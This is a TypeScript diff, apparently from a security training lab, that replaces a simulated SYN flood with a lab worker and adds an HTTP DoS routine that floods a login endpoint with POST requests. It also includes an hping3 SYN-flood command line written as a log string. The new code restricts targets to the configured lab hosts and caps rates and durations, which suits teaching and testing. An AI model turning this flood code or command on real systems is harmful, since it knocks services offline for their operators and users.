@@ -1,56 +1,70 @@
-import { sendHackerPacketEvent } from '../services/telemetry.service.js';
-
-let isSynFloodRunning = false;
-let synFloodInterval: NodeJS.Timeout | null = null;
+import { LAB, exact, integer, labPort } from '../config.js';
+import { processes } from '../services/process.service.js';
+import { status } from '../services/telemetry.service.js';
+import { createLabWorker } from '../services/worker.service.js';
 
 export async function startSynFloodAttack(
-  targetIp: string = '172.20.0.20',
-  port: number = 8080,
-  durationSec: number = 10
+  targetIp: unknown = LAB.server,
+  port: unknown = 8080,
+  durationSec: unknown = 10,
+  packetsPerSec: unknown = 100
 ) {
-  if (isSynFloodRunning) {
-    return { status: 'already_running', message: 'SYN Flood is already active' };
-  }
+  exact(targetIp, LAB.server, 'targetIp');
+  const targetPort = labPort(port);
+  const duration = integer(durationSec, 1, 30, 'durationSec');
+  const rate = integer(packetsPerSec, 1, 1000, 'packetsPerSec');
 
-  isSynFloodRunning = true;
-  console.log(`[SYN Flood] Bắt đầu SYN Flood (hping3 style) tới ${targetIp}:${port}`);
-
-  const terminalLog = `[SYN-FLOOD] Running: hping3 -S -p ${port} --rand-source --interval u1000 ${targetIp}`;
-
-  await sendHackerPacketEvent('SYN_FLOOD', 'FLOODING', terminalLog, {
-    protocol: 'TCP',
-    src: '172.20.0.66:RANDOM',
-    dst: `${targetIp}:${port}`,
-    flags: 'S',
-    extracted_data: 'SYN Flood packet flood initiated'
+  return processes.start('SYN_FLOOD', duration, {
+    commands: [createLabWorker('syn', targetPort, rate)]
   });
-
-  synFloodInterval = setInterval(async () => {
-    await sendHackerPacketEvent('SYN_FLOOD', 'FLOODING', `[SYN-FLOOD] Flooding target ${targetIp}:${port} with SYN packets (backlog exhausting)`, {
-      protocol: 'TCP',
-      src: '172.20.0.66:RANDOM',
-      dst: `${targetIp}:${port}`,
-      flags: 'S'
-    });
-  }, 1000);
-
-  setTimeout(() => {
-    stopSynFloodAttack();
-  }, durationSec * 1000);
-
-  return {
-    status: 'started',
-    mode: 'SYN_FLOOD',
-    target: `${targetIp}:${port}`,
-    durationSec
-  };
 }
 
 export function stopSynFloodAttack() {
-  if (synFloodInterval) {
-    clearInterval(synFloodInterval);
-    synFloodInterval = null;
-  }
-  isSynFloodRunning = false;
-  console.log('[SYN Flood] Đã dừng tấn công SYN Flood');
+  return processes.stop('SYN_FLOOD');
+}
+
+export async function startHttpDosAttack(
+  targetUrl: unknown = LAB.loginUrl,
+  ratePerSec: unknown = 50,
+  durationSec: unknown = 10
+) {
+  exact(targetUrl, LAB.loginUrl, 'targetUrl');
+  const rate = integer(ratePerSec, 1, 50, 'ratePerSec');
+  const duration = integer(durationSec, 1, 30, 'durationSec');
+  const controller = new AbortController();
+  let sent = 0;
+  let succeeded = 0;
+  let failed = 0;
+
+  return processes.start('DOS_FLOOD', duration, {
+    onTick: () => {
+      const requests = Array.from({ length: rate }, async () => {
+        sent += 1;
+        try {
+          const response = await fetch(LAB.loginUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: 'load-test-user', password: 'invalid-password' }),
+            signal: AbortSignal.any([controller.signal, AbortSignal.timeout(1500)])
+          });
+          await response.body?.cancel();
+          succeeded += 1;
+        } catch {
+          failed += 1;
+        }
+      });
+
+      void Promise.allSettled(requests).then(() => {
+        if (!processes.isRunning('DOS_FLOOD')) return;
+        status('DOS_FLOOD', 'RUNNING', `[HTTP-DOS] Đã gửi ${sent} request tới API đăng nhập`, {
+          target: LAB.loginUrl,
+          ratePerSec: rate,
+          sent,
+          succeeded,
+          failed
+        });
+      });
+    },
+    onStop: () => controller.abort()
+  });
 }
